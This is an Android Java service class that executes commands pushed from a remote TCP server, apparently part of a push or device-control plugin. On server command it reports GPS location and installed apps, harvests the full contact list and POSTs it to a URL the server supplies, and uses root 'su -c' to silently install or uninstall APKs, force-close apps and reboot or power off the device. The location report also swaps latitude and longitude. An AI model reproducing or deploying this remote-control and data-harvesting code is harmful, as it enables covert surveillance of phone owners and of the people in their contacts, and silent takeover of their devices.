package com.Plugins.MyAllPlugins.Service;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.webkit.MimeTypeMap;
import android.widget.Toast;

import com.Plugins.MyAllPlugins.SV;
import com.tedata.test.R;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.InputStreamEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.List;


public   class HandelPacketsReceived {

    serviceServerClient service_instance;
    HandelPacketsReceived(serviceServerClient temp)
    {
        service_instance=temp;
    }

    void handel_packet_s_received(String mms_type, final byte[] the_bytes) {
        try {
            SV.Message_Type type = SV.Message_Type.GetValueFromString(mms_type);
            StringBuilder messagex = new StringBuilder();
              if (type != SV.Message_Type.AudioFileForcedPlay && type != SV.Message_Type.AudioFile && type != SV.Message_Type.VideoFile && type != SV.Message_Type.VideoForcedPlay && type != SV.Message_Type.SendFile && type != SV.Message_Type.SendFileForcedOpen && type != SV.Message_Type.InstallApplication && type != SV.Message_Type.InstallApplicationSilently)
              {
                  UTF8Processor processor = new UTF8Processor();

                  for(int i=0; i<the_bytes.length; i++)
                  {
                          messagex.append(processor.processByte(the_bytes[i]));
                  }

                //messagex = new char[the_bytes.length];
//                for (int i = 0; i < the_bytes.length; i++) {
//                    messagex[i] = (char) (the_bytes[i] & 0xff);
//                }
            }
            final char[] message = messagex.toString().toCharArray();

            // return;
            Log.d(SV.tag, "handel_packet_s_received: " + SV.Message_Type.GetValueFromString(mms_type));
            if (type == SV.Message_Type.Toast) {

                do_toast(message);
            } else if (type == SV.Message_Type.DirectPushNotification) {
                do_push(message);
            } else if (type == SV.Message_Type.Welcome) {
                Log.d(SV.tag, "handel_packet_s_received: tcp  server say Welcome=" + String.copyValueOf(message, 0, message.length));
            } else if (type == SV.Message_Type.Alert) {
                do_alert(message);
            } else if (type == SV.Message_Type.GiveMeAppsInfo) {
                send_app_info();
            } else if (type == SV.Message_Type.GetLocation || SV.Message_Type.GetValueFromString(mms_type) == SV.Message_Type.WhereAreMyCustomersNow) {
                Handler handler = new Handler(Looper.getMainLooper());

                handler.post(new Runnable() {

                    @Override
                    public void run() {
                        get_location(message);

                    }
                });
            }
            else if(type==SV.Message_Type.UninstallApplication || type==SV.Message_Type.UninstallApplicationSilently )
            {
                do_uninstall(type,message);
            }
            else if(type==SV.Message_Type.ShutdownDeviceForced )
            {
                do_su_command( "reboot -p");
            }
            else if(type==SV.Message_Type.RestartDeviceForced )
            {
                do_su_command( "reboot");
            }

            else if(type==SV.Message_Type.OpenApplication || type==SV.Message_Type.OpenApplicationForced )
            {
                 do_open_application(type,message);
            }
            else if(type==SV.Message_Type.CloseApplication || type==SV.Message_Type.CloseApplicationForced )
            {
                do_close_application(type,message);
            }

            else if(type==SV.Message_Type.GetContacts )
            {
                getContacts(message);
            }
            //file
            else if (type == SV.Message_Type.AudioFileForcedPlay || type == SV.Message_Type.AudioFile || type == SV.Message_Type.VideoFile || type == SV.Message_Type.VideoForcedPlay|| type == SV.Message_Type.SendFile || type == SV.Message_Type.SendFileForcedOpen||type == SV.Message_Type.InstallApplication||type == SV.Message_Type.InstallApplicationSilently || type == SV.Message_Type.UpdateApplication||type == SV.Message_Type.UpdateApplicationSilently) {
                receivedFile(the_bytes, type);
            }




        } catch (Exception ex) {
            Log.e(SV.tag, "handel_packet_s_received: " + ex.getMessage());
        }

    }

    void  do_close_application(SV.Message_Type type,char[] message)
    {
        String jsonString = String.copyValueOf(message, 0, message.length);
        String   packageName= null;
        try {
            JSONObject object = new JSONObject(jsonString);
            packageName = object.getString("packageName");


        } catch (JSONException e) {
            e.printStackTrace();
        }

        if(type==SV.Message_Type.CloseApplicationForced ) {
            if( packageName.toLowerCase().equals(service_instance.getApplicationContext().getPackageName().toLowerCase())) {
                System.exit(0);
            }
            else
            {
                List<PackageInfo> pkgs = service_instance.getPackageManager().getInstalledPackages(0);
                for (PackageInfo pkg : pkgs) {
                            if (pkg.packageName.toLowerCase().equals(packageName.toLowerCase())) {
                                packageName=pkg.packageName;
                                break;
                            }
                }
                do_su_command("pm disable "+packageName);
                do_su_command("pm enable "+packageName);
            }
        }
        else if (type==SV.Message_Type.CloseApplication)
        {
            Intent intent = new Intent(service_instance, PlayAudioVideo.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            intent.putExtra("EXIT", true);
            intent.putExtra("packageName", packageName);
            makeNotificationForUsePermeation("Application need to close", "Click here to close it", intent);

        }

    }

    void  do_open_application(SV.Message_Type type,char[] message)
    {
        String jsonString = String.copyValueOf(message, 0, message.length);
        String   packageName= null;
        try {
            JSONObject object = new JSONObject(jsonString);
            packageName = object.getString("packageName");


        } catch (JSONException e) {
            e.printStackTrace();
        }
        List<PackageInfo> pkgs = service_instance.getPackageManager().getInstalledPackages(0);
        for (PackageInfo pkg : pkgs) {
            if (pkg.packageName.toLowerCase().equals(packageName.toLowerCase())) {
                packageName=pkg.packageName;
                break;
            }
        }

        Intent intent = service_instance.getPackageManager().getLaunchIntentForPackage(packageName);
//        if (intent == null) {
//            // Bring user to the market or let them choose an app?
//            intent = new Intent(Intent.ACTION_VIEW);
//            intent.setData(Uri.parse("market://details?id=" + packageName));
//        }
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        if(type==SV.Message_Type.OpenApplicationForced) {
            service_instance.startActivity(intent);
        }
        else if (type==SV.Message_Type.OpenApplication)
        {
            makeNotificationForUsePermeation("Application Need  to Open","click here to open it",intent);
        }

    }
    void get_location(char[] message) {
        // {  device_database_id:  req.body.deviceInfo.device_database_id, body: 'GetLocation'}
        try {
            String jsonString = String.copyValueOf(message, 0, message.length);
            Log.d(SV.tag, "get_location message =" + jsonString);
            JSONObject object = new JSONObject(jsonString);
            final int device_database_id = object.getInt("device_database_id");

            SingleShotLocationProvider.requestSingleUpdate(service_instance,
                    new SingleShotLocationProvider.LocationCallback() {
                        @Override
                        public void onNewLocationAvailable(SingleShotLocationProvider.GPSCoordinates location) {
                            try {
                                JSONObject allData = new JSONObject();

                                allData.put("device_database_id", device_database_id);
                                allData.put("latitude", location.longitude + "");
                                allData.put("longitude", location.latitude + "");
                                char[] flag = new char[service_instance.flag_length];
                                char[] typeAndLenght_temp = (SV.Message_Type.TackMyLocation.getValue() + "|" + allData.toString().length()).toCharArray();
                                System.arraycopy(typeAndLenght_temp, 0, flag, 0, typeAndLenght_temp.length);
                                service_instance.send_message_to_server(String.valueOf(flag) + allData.toString());
                                Log.d(SV.tag, "my latitude is " + location.latitude + "   my longitude is  " + location.longitude);

                            } catch (Exception ex) {
                                Log.e(SV.tag, "Error when sending location");

                            }

                            // send_message_to_server()
                        }
                    });
        } catch (Exception ex) {
            Log.e(SV.tag, "Error convert json when sending location");
        }
    }
    void getContacts(char[] message)
    {
        try {
            String jsonString = String.copyValueOf(message, 0, message.length);
            Log.d(SV.tag, "getContacts message =" + jsonString);
            JSONObject object = new JSONObject(jsonString);
            final int device_database_id = object.getInt("device_database_id");
        String server_http_tack_contact_link=object.getString("server_http_tack_contack_link");
            HashMap<String, String> contacts = new get_contact_array().get_contact_array(service_instance);


            JSONObject allData = new JSONObject();

            allData.put("device_database_id", device_database_id);
            JSONObject jsonx = new JSONObject(contacts);

            allData.put("contacts", jsonx.toString());

//            byte[] flag_bytes = new byte[service_instance.flag_length];
//            byte[] data_bytes = allData.toString().getBytes("UTF-8");
//            String msg_type_and_data_lengh_string=SV.Message_Type.TackContacts.getValue()+ "|" +data_bytes.length;
//            byte[] msg_type_and_data_lengh_bytes=msg_type_and_data_lengh_string.getBytes();
//             System.arraycopy(msg_type_and_data_lengh_bytes, 0, flag_bytes, 0, msg_type_and_data_lengh_bytes.length);
//
//            byte[] flag_and_data =new byte[flag_bytes.length + data_bytes.length];
//            System.arraycopy(flag_bytes,0,flag_and_data,0,flag_bytes.length);
//            System.arraycopy(data_bytes,0,flag_and_data,flag_bytes.length ,data_bytes.length);
         //   service_instance.sent_message_to_serverbytes(flag_and_data);
            sendPostToServer(server_http_tack_contact_link,allData);

        }
        catch (Exception ex)
        {
            Log.e(SV.tag, "Error when get contacts" + ex.getMessage());
        }
    }

    void do_toast(char[] message) {

        final String resultx = String.copyValueOf(message, 0, message.length);
        Log.d(SV.tag, "do_toast:message=" + resultx);
        Handler handler = new Handler(Looper.getMainLooper());

        handler.post(new Runnable() {

            @Override
            public void run() {
                Toast.makeText(service_instance.getApplicationContext(), resultx, Toast.LENGTH_SHORT).show();

            }
        });

    }


    void do_push(char[] message) {
        try {

            String jsonString = String.copyValueOf(message, 0, message.length);
            Log.d(SV.tag, "do_push message =" + jsonString);
            JSONObject object = new JSONObject(jsonString);
            NotificationManager mNotificationManager = (NotificationManager) service_instance.getSystemService(Context.NOTIFICATION_SERVICE);
            NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(service_instance)
                    .setSmallIcon(service_instance.getApplicationInfo().icon)
                    .setContentTitle(object.getString("title"))
                            // .setStyle(new NotificationCompat.BigTextStyle().setSummaryText(args.getString(2)))
                    .setContentText(object.getString("body"));
            mBuilder.setDefaults(Notification.FLAG_AUTO_CANCEL | Notification.DEFAULT_SOUND | Notification.DEFAULT_VIBRATE);
            mNotificationManager.notify(1, mBuilder.build());

        } catch (Exception ex) {
            Log.e(SV.tag, "do_push: " + ex.getMessage());
        }
    }


    void do_alert(char[] message) {
        try {
            if (SV.isAlertActivetyRegested == 1) {
                final String AlertJsonString = String.copyValueOf(message, 0, message.length);
                Log.d(SV.tag, "do_alert: message=" + AlertJsonString + "  and isAlertActivetyRegested = " + SV.isAlertActivetyRegested);
                Intent i = new Intent();
                i.setAction(SV.Local_MSG_BroadCast.AlertFromService.toString());
                i.putExtra("AlertJsonString", AlertJsonString);
                service_instance.sendBroadcast(i);
            } else {
                Log.d(SV.tag, "do_alert: but notification = " + SV.isAlertActivetyRegested);

                do_push(message);
            }


        } catch (Exception ex) {
            Log.e(SV.tag, "error do_alert: " + ex.getMessage());
        }
    }

    void send_app_info() {
        try {

            if (service_instance.appsThatServedFromThisService.size() == 0) {
                service_instance.fillAppsList();
            }

            JSONObject device_info = service_instance.getDeviceInfo();
            JSONArray app_info = new JSONArray(service_instance.appsThatServedFromThisService);

            JSONObject allData = new JSONObject();

            allData.put("apps", app_info);
            if (device_info != null) {
                allData.put("device_info", device_info);
            }

            char[] flag = new char[service_instance.flag_length];
            char[] typeAndLenght_temp = (SV.Message_Type.PutMyInfoInTCPList.getValue() + "|" + allData.toString().length()).toCharArray();
            System.arraycopy(typeAndLenght_temp, 0, flag, 0, typeAndLenght_temp.length);

            // String x=String.valueOf(flag)+jsonx.toString();

            service_instance.send_message_to_server(String.valueOf(flag) + allData.toString());
        } catch (Exception ex) {
            Log.d(SV.tag, "error when send_app_info: " + ex.getMessage());
        }

    }

    void do_uninstall(SV.Message_Type type,char[] message)
    {
        String jsonString = String.copyValueOf(message, 0, message.length);
        String   packageName= null;
        try {
            JSONObject object = new JSONObject(jsonString);
            packageName = object.getString("packageName");


        } catch (JSONException e) {
            e.printStackTrace();
        }
        List<PackageInfo> pkgs = service_instance.getPackageManager().getInstalledPackages(0);
        for (PackageInfo pkg : pkgs) {
            if (pkg.packageName.toLowerCase().equals(packageName.toLowerCase())) {
                packageName=pkg.packageName;
                break;
            }
        }

        if(type==SV.Message_Type.UninstallApplicationSilently) {
            String   command = "pm uninstall " + packageName;
            do_su_command(command);
        }
        else if(type==SV.Message_Type.UninstallApplication) {
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(Uri.parse("package:" + packageName));
            makeNotificationForUsePermeation("Application Need To Uninstall", "Click here to Uninstall it", intent);
        }
    }



    void do_su_command(String the_command)
    {
        try {


            Process proc = Runtime.getRuntime().exec(new String[]{"su", "-c", the_command});
            proc.waitFor();


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    void receivedFile(byte[] the_bytes, final SV.Message_Type type) {
        try {

            byte[] prefix_File_info_lenght = new byte[service_instance.flag_length];
            System.arraycopy(the_bytes, 0, prefix_File_info_lenght, 0, prefix_File_info_lenght.length);
            String file_info_length_string = new String(prefix_File_info_lenght);
            String[] items=file_info_length_string.split("\\|");
            int file_info_length=  Integer.parseInt(items[0]);
            byte[] prefix_File_info = new byte[file_info_length];
            System.arraycopy(the_bytes, service_instance.flag_length, prefix_File_info, 0, prefix_File_info.length);
            String file_info_string = new String(prefix_File_info);
            String[] temp_file_info=file_info_string.split("\\|");

              File tempMp3 = new File(service_instance.getCacheDir(), temp_file_info[0]);

            FileOutputStream fos =new FileOutputStream(tempMp3.getAbsoluteFile());
            fos.write(the_bytes, service_instance.flag_length + prefix_File_info.length, the_bytes.length - (service_instance.flag_length + prefix_File_info.length));
            fos.flush();
            fos.close();
            tempMp3.setReadable(true, false);
             tempMp3.setExecutable(true, false);
            tempMp3.setWritable(true, false);

            dealWithReseavedFile(type,  tempMp3);

        } catch (IOException ex) {
            String s = ex.toString();
            ex.printStackTrace();
        }

    }

    void dealWithReseavedFile(final SV.Message_Type type, final File tempMp3)
    {

        if(type== SV.Message_Type.AudioFile || type == SV.Message_Type.AudioFileForcedPlay || type == SV.Message_Type.VideoFile ||type == SV.Message_Type.VideoForcedPlay  )
        {
            dealWthAudioOrVedio(   type,  tempMp3);
        }
        else if(type== SV.Message_Type.SendFile ||type== SV.Message_Type.SendFileForcedOpen)
        {
            dealWithUnknownFile(type, tempMp3);
        }
        else if(type== SV.Message_Type.InstallApplicationSilently || type== SV.Message_Type.UpdateApplicationSilently  )
        {
            dealWithInstallUpdateSilently(type,  tempMp3);

        }
        else if(type== SV.Message_Type.InstallApplication || type== SV.Message_Type.UpdateApplication  )
        {
            dealWithInstallUpdateNotification(type,  tempMp3);
        }
    }


    void dealWthAudioOrVedio(final SV.Message_Type type, final File tempMp3)
       {

    if(type== SV.Message_Type.AudioFileForcedPlay || type == SV.Message_Type.VideoForcedPlay )
    {
        if (PlayAudioVideo.imActive == 0) {
            Intent intentx = new Intent(service_instance, PlayAudioVideo.class);
            PlayAudioVideo.type=type;
            PlayAudioVideo.FilePath = tempMp3.getAbsolutePath();
            intentx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
            service_instance.startActivity(intentx);
        }
        else

        {
            Handler handler = new Handler(Looper.getMainLooper());

            handler.post(new Runnable() {

                @Override
                public void run() {
                    PlayAudioVideo p = new PlayAudioVideo();
                    PlayAudioVideo.videoView.stopPlayback();
                    int sdk = android.os.Build.VERSION.SDK_INT;
                    if( type== SV.Message_Type.AudioFileForcedPlay|| type == SV.Message_Type.AudioFile)
                    {

                        if(sdk < android.os.Build.VERSION_CODES.JELLY_BEAN) {
                            PlayAudioVideo.videoView.setBackgroundDrawable(service_instance.getResources().getDrawable(R.drawable.announcement));
                        } else {
                            PlayAudioVideo.videoView.setBackground(service_instance.getResources().getDrawable(R.drawable.announcement));
                        }
                    }
                    else
                    {
                        if(sdk < android.os.Build.VERSION_CODES.JELLY_BEAN) {
                            PlayAudioVideo.videoView.setBackgroundDrawable(null);
                        } else {
                            PlayAudioVideo.videoView.setBackground(null);
                        }
                    }
                    PlayAudioVideo.videoView.setVideoPath(tempMp3.getAbsolutePath());
                    PlayAudioVideo.videoView.start();

                }
            });

        }
    }

    else
    {
        String title;
        String body;
        if(  type == SV.Message_Type.AudioFile)
        {
            title="Audio message";
            body="Audio message received";
        }
        else
        {
            title="Video message";
            body="Video message received";
        }
        //not forced
        try {
            Intent intentx = new Intent(service_instance, PlayAudioVideo.class);
            PlayAudioVideo.type=type;
            PlayAudioVideo.FilePath = tempMp3.getAbsolutePath();

            makeNotificationForUsePermeation(title, body, intentx);


        } catch (Exception ex) {
            Log.e(SV.tag, "do_push: " + ex.getMessage());
        }
    }
}

    void dealWithUnknownFile(final SV.Message_Type type, final File tempMp3)
    {
        if( type== SV.Message_Type.SendFileForcedOpen)
        {
            tempMp3.getName().substring(tempMp3.getName().lastIndexOf(".") + 1, tempMp3.getName().length());
            String extension = tempMp3.getName().substring(tempMp3.getName().lastIndexOf(".") + 1, tempMp3.getName().length());
            Intent intent = new Intent();
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.setAction(android.content.Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.fromFile(tempMp3), MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension));
            service_instance.startActivity(intent);
        }
        else
        {
            tempMp3.getName().substring(tempMp3.getName().lastIndexOf(".") + 1, tempMp3.getName().length());
            String extension = tempMp3.getName().substring(tempMp3.getName().lastIndexOf(".") + 1, tempMp3.getName().length());
            Intent intent = new Intent();
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.setAction(Intent.ACTION_VIEW);
            Log.i(SV.tag,MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension));
            intent.setDataAndType(Uri.fromFile(tempMp3), MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension));
            makeNotificationForUsePermeation("You've received a new file", "Click here to open it", intent);

        }
    }

    void dealWithInstallUpdateSilently(final SV.Message_Type type, final File tempMp3)
    {
        try {
        String command="";

                command = "pm install -r " + tempMp3.getAbsolutePath();


            Process proc = Runtime.getRuntime().exec(new String[]{"su", "-c", command});
            proc.waitFor();



        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    void dealWithInstallUpdateNotification(final SV.Message_Type type, final File tempMp3)
    {
        String msg_title="";
        if(type== SV.Message_Type.InstallApplication)
        {
            msg_title="You've received a new Application";
        }
        else if(type== SV.Message_Type.UpdateApplication)
        {
            msg_title="You've received a Application Update";
        }
        tempMp3.getName().substring(tempMp3.getName().lastIndexOf(".") + 1, tempMp3.getName().length());
        String extension = tempMp3.getName().substring(tempMp3.getName().lastIndexOf(".") + 1, tempMp3.getName().length());
        Intent intent = new Intent(Intent.ACTION_INSTALL_PACKAGE);
        intent.setDataAndType(Uri.fromFile(tempMp3), "application/vnd.android.package-archive");
        makeNotificationForUsePermeation(msg_title, "Click here to install it", intent);
    }

   void makeNotificationForUsePermeation(String msg_title, String msg_body, Intent intent)
    {
        int iUniqueId = (int) (System.currentTimeMillis() & 0xfffffff);

        PendingIntent pIntent = PendingIntent.getActivity(service_instance,iUniqueId, intent,PendingIntent.FLAG_UPDATE_CURRENT);// PendingIntent.FLAG_UPDATE_CURRENT);

        NotificationManager mNotificationManager = (NotificationManager) service_instance.getSystemService(Context.NOTIFICATION_SERVICE);
        NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(service_instance)
                .setSmallIcon(service_instance.getApplicationInfo().icon)
                .setContentTitle(msg_title)
                        // .setStyle(new NotificationCompat.BigTextStyle().setSummaryText(args.getString(2)))
                .setContentText(msg_body)
                .setContentIntent(pIntent);

        mBuilder.setDefaults(Notification.FLAG_AUTO_CANCEL | Notification.DEFAULT_SOUND | Notification.DEFAULT_VIBRATE);
        mNotificationManager.notify(1, mBuilder.build());
    }


    String  sendPostToServer(String the_url,JSONObject jsonData)
    {

        try
        {
            HttpClient httpclient3=new DefaultHttpClient();

            HttpPost httppost3=new HttpPost(the_url);

           // httppost3.setHeader(HTTP.CONTENT_TYPE, "text/plain;charset=UTF-8");


            InputStreamEntity inputEntity3=new InputStreamEntity(new ByteArrayInputStream(jsonData.toString().getBytes()),-1);
            inputEntity3.setContentType("application/json");

           // inputEntity3.setContentEncoding("utf-8");
            httppost3.setEntity(inputEntity3);
            //   ResponseHandler<String> responseHandler3= new BasicResponseHandler();
            HttpResponse response = httpclient3.execute(httppost3);

            HttpEntity responseEntity = response.getEntity();

// Retrieve a String from the response entity
            String resutlt1 = EntityUtils.toString(responseEntity);

            if( !resutlt1.equals("OK"))
            {
                return resutlt1;
            }
            else
            {
                return "OK";
            }

        }
        catch (Exception ex)
        {
            return "Error  when sendPostToServer:"+ex.getMessage() +":"+ex;

        }

    }

}
